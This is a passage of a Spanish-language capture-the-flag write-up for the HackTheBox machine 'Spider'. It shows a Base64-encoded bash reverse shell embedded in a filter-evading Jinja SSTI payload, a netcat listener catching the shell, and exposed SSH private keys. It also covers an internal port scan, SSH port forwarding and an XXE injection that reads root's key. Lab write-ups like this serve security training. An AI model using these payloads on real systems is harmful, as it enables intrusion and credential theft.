<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=color:#66d9ef>with</span> os<span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#34;&lt;reverse shell command&gt;&#34;</span>)<span style=color:#f92672>.</span>read() <span style=color:#66d9ef>as</span> a: 
    <span style=color:#66d9ef>pass</span>
</code></pre></div><p>Podemos construir el comando para ejecutar una <em>reverse shell</em> y codificarlo en Base64 para evitar caracteres especiales que puedan ser bloqueados:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ echo -n <span style=color:#e6db74>&#39;bash  -i &gt;&amp; /dev/tcp/10.10.17.44/4444 0&gt;&amp;1&#39;</span> | base64 
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div><p>El <em>payload</em> definitivo para explotar el SSTI es el siguiente:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-django data-lang=django><span style=color:#75715e>{%</span> <span style=color:#66d9ef>with</span> a <span style=color:#f92672>=</span> request<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;application&#34;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#34;\x5f\x5fglobals\x5f\x5f&#34;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#34;\x5f\x5fbuiltins\x5f\x5f&#34;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#34;\x5f\x5fimport\x5f\x5f&#34;</span><span style=color:#f92672>](</span><span style=color:#e6db74>&#34;os&#34;</span><span style=color:#f92672>)[</span><span style=color:#e6db74>&#34;popen&#34;</span><span style=color:#f92672>](</span><span style=color:#e6db74>&#34;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash&#34;</span><span style=color:#f92672>)[</span><span style=color:#e6db74>&#34;read&#34;</span><span style=color:#f92672>]()</span> <span style=color:#75715e>%}</span> a <span style=color:#75715e>{%</span> <span style=color:#66d9ef>endwith</span> <span style=color:#75715e>%}</span> 
</code></pre></div><h2 id=intrusión-en-la-máquina>Intrusión en la máquina</h2>
<p>Y obtenemos acceso a la máquina como usuario <code>chiv</code> mediante <code>nc</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ nc -nlvp <span style=color:#ae81ff>4444</span>
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.243.
Ncat: Connection from 10.10.10.243:46884.
bash: cannot set terminal process group (1622): Inappropriate ioctl for device 
bash: no job control in this shell
chiv@spider:~$ cat user.txt
1682e37de0725754ecdfb8c816c4f80b
</code></pre></div><p>En este punto, ya tenemos la <em>flag</em> <code>user.txt</code>.</p>
<p>Podemos obtener una consola más estable por SSH porque tenemos permisos de lectura sobre el archivo <code>id_rsa</code> de <code>chiv</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>chiv@spider:~$ cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV 
gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS
U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9
MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7
BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2
VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu
6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs
hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl
Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc
XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq
54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy
f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62
nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL
j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO
JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW
K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv
hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ
mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8
gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb
0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2
nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W
CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG
rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO
TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6
IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==
-----END RSA PRIVATE KEY-----
</code></pre></div><h2 id=enumeración-del-sistema>Enumeración del sistema</h2>
<p>Como usuario <code>chiv</code>, podemos realizar un sencillo escaneo de puertos internos y ver que el puerto 8080 está abierto:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ssh -i id_rsa chiv@10.10.10.243
chiv@spider:~$ for port in $(seq 1 65535); do timeout 1 echo 2&gt;/dev/null &gt; /dev/tcp/127.0.0.1/$port &amp;&amp; echo &#34;Port $port OPEN&#34;; done 
Port 22 OPEN
Port 80 OPEN
Port 3306 OPEN
Port 8080 OPEN
</code></pre></div><p>Podemos realizar un reenvío de puertos mediante SSH para hacer accesible el puerto 8080 desde el puerto 8888 de nuestra máquina de atacante (no se ha elegido el 8080 porque Burp Suite escucha en este puerto).</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ssh -i id_rsa chiv@10.10.10.243 -L 8888:127.0.0.1:8080 
</code></pre></div><h2 id=encontrando-un-xxe>Encontrando un XXE</h2>
<p>Si se entra ahora a <code>http://localhost:8888</code>, aparecerá una página de inicio de sesión:</p>
<p><img src=../../../images/HTB/Spider/Spider-port-forwarding.png alt="Beta login"></p>
<p>Esta es otra aplicación realizada con Flask (lo sabemos por la misma razón que antes). Esta vez, la <em>cookie</em> de sesión generada contiene la siguiente información:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 -m flask_unsign --decode --cookie <span style=color:#e6db74>&#39;.eJxtjjFvgzAYRP9K5bmDSZMFqQsyhprGyB-2Cd6gjgTBdlHKQIjy3xuGbh1P757u7sgt3qH4jl46FCOVcmrTRYqRaajnoH1Un-vjrcvN0Cq6l9mUWBURcYKjJvCp0r6w_mNV1UyePFSKJyWdcrgkZuNbNtgRUVsmcLo3tC-7jM-87gcdqau80MK68WaJFmIdl2Zlzz02Q4D2P7_RfWmcO6kAvV7FVSp4s5420hujI4Yb_YULzKe_viSsajPIYfsX7K7Z4YP1kHKC39HjFU3fQ5h_UIwfv0J0Vqg.YQRD8w.gRIxNZ4auzfGHswxcJjPUpOabEM&#39;</span> 
{&#39;lxml&#39;: b&#39;PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+N1JvY2t5PC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=&#39;, &#39;points&#39;: 0}
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ echo PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+N1JvY2t5PC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4<span style=color:#f92672>=</span> | base64 -d
&lt;!-- API Version 1.0.0 --&gt;
&lt;root&gt;
    &lt;data&gt;
        &lt;username&gt;7Rocky&lt;/username&gt;
        &lt;is_admin&gt;0&lt;/is_admin&gt;
    &lt;/data&gt;
&lt;/root&gt;
</code></pre></div><p>Vemos que contiene un documento XML codificado en Base64 y que incluye el nombre de usuario con el que hemos iniciado la sesión. Esto indica que el vector de ataque es probablemente algún tipo de inyección de Entidad Externa XML (XXE).</p>
<p>Parece que solamente tenemos control sobre el nombre de usuario. Esto es un problema si queremos realizar un ataque XXE, ya que las entidades XML no pueden estar entre etiquetas de datos, deben estar definidas en el primer nivel. Existen algunos <em>payloads</em> que utilizan inyección XPATH, pero no funcionan esta vez.</p>
<p>Utilizando Burp Suite, podemos ver cómo se realiza la petición al iniciar sesión:</p>
<p><img src=../../../images/HTB/Spider/Spider-burp.png alt="Burp Suite"></p>
<p>Como se muestra en la captura, además de <code>username</code> hay un parámetro <code>version</code> que por defecto vale <code>1.0.0</code>. Podemos utilizar <code>curl</code> para realizar una petición cambiando el número de versión y ver qué ocurre:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ curl http://localhost:8888/login -svd <span style=color:#e6db74>&#39;username=7Rocky&amp;version=1.33.7&#39;</span>
*   Trying 127.0.0.1:8888...
* Connected to localhost (127.0.0.1) port 8888 (#0)
&gt; POST /login HTTP/1.1
&gt; Host: localhost:8888
&gt; User-Agent: curl/7.79.1
&gt; Accept: */*
&gt; Content-Type: application/x-www-form-urlencoded
&gt; Content-Length: <span style=color:#ae81ff>30</span>
&gt;
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 302 FOUND
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 217
&lt; Location: http://localhost:8888/site
&lt; Vary: Cookie
&lt; Set-Cookie: session=.eJxtzstqhDAAheFXKVl3YYIDHaGLhvE6GInmgtmNRKoY03QiVB3m3eumu67P-eF7ALPOBkQP8NKBCPCYJDpeGZ0KUcvFihnKXpZbl6nxxpOQpY700_rdIl3y_eNOkQt7mW8Vw1Shs204wQrijM_DVAf82A1WgblQqQsaJJbHg-yNaxsrlNgTz1M3cZRvzBZGZBqpZKi6lCxEDqOA__Xa9-Zzq-dlFGiFR4-r-Ofwubac1L012muBbYf-_uXpBk17eA7fW8gu5KrnfOeNfwfPV-C-Rrt4EAXPX_HQWOc.YXPYog.GJtBaEqASFJ3QxKY08rhwi3v5NQ; HttpOnly; Path=/
&lt;
&lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt;
&lt;title&gt;Redirecting...&lt;/title&gt;
&lt;h1&gt;Redirecting...&lt;/h1&gt;
* Connection #0 to host localhost left intact
&lt;p&gt;You should be redirected automatically to target URL: &lt;a href=&#34;/site&#34;&gt;/site&lt;/a&gt;.  If not click the link.
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ python3 -m flask_unsign --decode --cookie <span style=color:#e6db74>&#39;.eJxtzstqhDAAheFXKVl3YYIDHaGLhvE6GInmgtmNRKoY03QiVB3m3eumu67P-eF7ALPOBkQP8NKBCPCYJDpeGZ0KUcvFihnKXpZbl6nxxpOQpY700_rdIl3y_eNOkQt7mW8Vw1Shs204wQrijM_DVAf82A1WgblQqQsaJJbHg-yNaxsrlNgTz1M3cZRvzBZGZBqpZKi6lCxEDqOA__Xa9-Zzq-dlFGiFR4-r-Ofwubac1L012muBbYf-_uXpBk17eA7fW8gu5KrnfOeNfwfPV-C-Rrt4EAXPX_HQWOc.YXPYog.GJtBaEqASFJ3QxKY08rhwi3v5NQ&#39;</span> 
{&#39;lxml&#39;: b&#39;PCEtLSBBUEkgVmVyc2lvbiAxLjMzLjcgLS0+Cjxyb290PgogICAgPGRhdGE+CiAgICAgICAgPHVzZXJuYW1lPjdSb2NreTwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+&#39;, &#39;points&#39;: 0}
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ echo PCEtLSBBUEkgVmVyc2lvbiAxLjMzLjcgLS0+Cjxyb290PgogICAgPGRhdGE+CiAgICAgICAgPHVzZXJuYW1lPjdSb2NreTwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+ | base64 -d
&lt;!-- API Version 1.33.7 --&gt;
&lt;root&gt;
    &lt;data&gt;
        &lt;username&gt;7Rocky&lt;/username&gt;
        &lt;is_admin&gt;0&lt;/is_admin&gt;
    &lt;/data&gt;
&lt;/root&gt;
</code></pre></div><p>Como se puede observar, tenemos control sobre el parámetro <code>version</code>. Esta vez sí que sirve para realizar un ataque XXE, porque podemos escapar del contexto del comentario (<code>&lt;!-- ... --></code>) e inyectar una entidad externa XML en el primer nivel.</p>
<p>Podemos mirar en <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection>PayloadsAllTheThings</a> y encontrar algún <em>payload</em> que nos sea útil.</p>
<p>Para explotar la vulnerabilidad de XXE, podemos crear un <em>script</em> en Bash llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Spider/xxe.sh><code>xxe.sh</code></a> para automatizar el proceso y extraer la información que nos interesa (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Spider#xxesh>aquí</a>). La idea es cargar archivos del servidor para leerlos.</p>
<p>Después de algunas pruebas, descubrimos que tenemos privilegios de <code>root</code>.</p>
<h2 id=acceso-a-la-máquina-como-root>Acceso a la máquina como <code>root</code></h2>
<p>Entonces, podemos leer la clave privada de SSH de <code>root</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ bash xxe.sh /root/.ssh/id_rsa | tee root_id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAl/dn2XpJQuIw49CVNdAgdeO5WZ47tZDYZ+7tXD8Q5tfqmyxq 
gsgQskHffuzjq8v/q4aBfm6lQSn47G8foq0gQ1DvuZkWFAATvTjliXuE7gLcItPt
iFtbg7RQV/xaTwAmdRfRLb7x63TG6mZDRkvFvGfihWqAnkuJNqoVJclgIXLuwUvk
4d3/Vo/MdEUb02ha7Rw9oHSYKR4pIgv4mDwxGGL+fwo6hFNCZ+YK96wMlJc3vo5Z
EgkdKXy3RnLKvtxjpIlfmAZGu0T+RX1GlmoPDqoDWRbWU+wdbES35vqxH0uM5WUh
vPt5ZDGiKID4Tft57udHxPiSD6YBhLT5ooHfFQIDAQABAoIBAFxB9Acg6Vc0kO/N
krhfyUUo4j7ZBHDfJbI7aFinZPBwRtq75VHOeexud2vMDxAeQfJ1Lyp9q8/a1mdb
sz4EkuCrQ05O9QthXJp0700+8t24WMLAHKW6qN1VW61+46iwc6iEtBZspNwIQjbN
rKwBlmMiQnAyzzDKtNu9+Ca/kZ/cAjLpz3m1NW7X//rcDL8kBGs8RfuHqz/R4R7e
HtCvxuXOFnyo/I+A3j1dPHoc5UH56g1W82NwTCbtCfMfeUsUOByLcg3yEypClO/M
s7pWQ1e4m27/NmU7R/cslc03YFQxow+CIbdd59dBKTZKErdiMd49WiZSxizL7Rdt
WBTACsUCgYEAyU9azupb71YnGQVLpdTOzoTD6ReZlbDGeqz4BD5xzbkDj7MOT5Dy
R335NRBf7EJC0ODXNVSY+4vEXqMTx9eTxpMtsP6u0WvIYwy9C7K/wCz+WXNV0zc0
kcSQH/Yfkd2jADkMxHXkz9THXCChOfEt7IUmNSM2VBKb1xBMkuLXQbMCgYEAwUBS
FhRNrIB3os7qYayE+XrGVdx/KXcKva6zn20YktWYlH2HLfXcFQQdr30cPxxBSriS
BAKYcdFXSUQDPJ1/qE21OvDLmJFu4Xs7ZdGG8o5v8JmF6TLTwi0Vi45g38DJagEl
w42zV3vV7bsAhQsMvd3igLEoDFt34jO9nQv9KBcCgYEAk8eLVAY7AxFtljKK++ui
/Xv9DWnjtz2UFo5Pa14j0O+Wq7C4OrSfBth1Tvz8TcW+ovPLSD0YKODLgOWaKcQZ
mVaF3j64OsgyzHOXe7T2iq788NF4GZuXHcL8Qlo9hqj7dbhrpPUeyWrcBsd1U8G3
AsAj8jItOb6HZHN0owefGX0CgYAICQmgu2VjZ9ARp/Lc7tR0nyNCDLII4ldC/dGg
LmQYLuNyQSnuwktNYGdvlY8oHJ+mYLhJjGYUTXUIqdhMm+vj7p87fSmqBVoL7BjT
Kfwnd761zVxhDuj5KPC9ZcUnaJe3XabZU7oCSDbj9KOX5Ja6ClDRswwMP31jnW0j
64yyLwKBgBkRFxxuGkB9IMmcN19zMWA6akE0/jD6c/51IRx9lyeOmWFPqitNenWK
teYjUjFTLgoi8MSTPAVufpdQV4128HuMbMLVpHYOVWKH/noFetpTE2uFStsNrMD8
vEgG/fMJ9XmHVsPePviZBfrnszhP77sgCXX8Grhx9GlVMUdxeo+j
-----END RSA PRIVATE KEY-----
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ chmod <span style=color:#ae81ff>600</span> root_id_rsa
</code></pre></div><p>Y finalmente acceder como <code>root</code> y conseguir la <em>flag</em> <code>root.txt</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ssh -i root_id_rsa root@10.10.10.243 
root@spider:~# cat root.txt
a50aa50be1beeb8c3d54bc200e40adbe
</code></pre></div><div class="mt6 instapaper_ignoref">
</div>
</div>
<aside aria-label=aside class="w-20-l mt6-l aside-desktop">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p>
<nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li>
<li><a href=#exploración-web>Exploración web</a></li>
<li><a href=#buscando-un-ssti>Buscando un SSTI</a></li>
<li><a href=#obtención-de-la-clave-secreta-de-flask>Obtención de la clave secreta de Flask</a></li>
<li><a href=#encontrando-una-inyección-de-código-sql>Encontrando una inyección de código SQL</a></li>
<li><a href=#explotando-un-ssti-rebuscado>Explotando un SSTI rebuscado</a></li>
<li><a href=#intrusión-en-la-máquina>Intrusión en la máquina</a></li>
<li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li>
<li><a href=#encontrando-un-xxe>Encontrando un XXE</a></li>
<li><a href=#acceso-a-la-máquina-como-root>Acceso a la máquina como <code>root</code></a></li>
</ul>
</nav>
</div>
</aside>
</article>
</main>
<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</div>
</div>
</footer>
</body>
</html>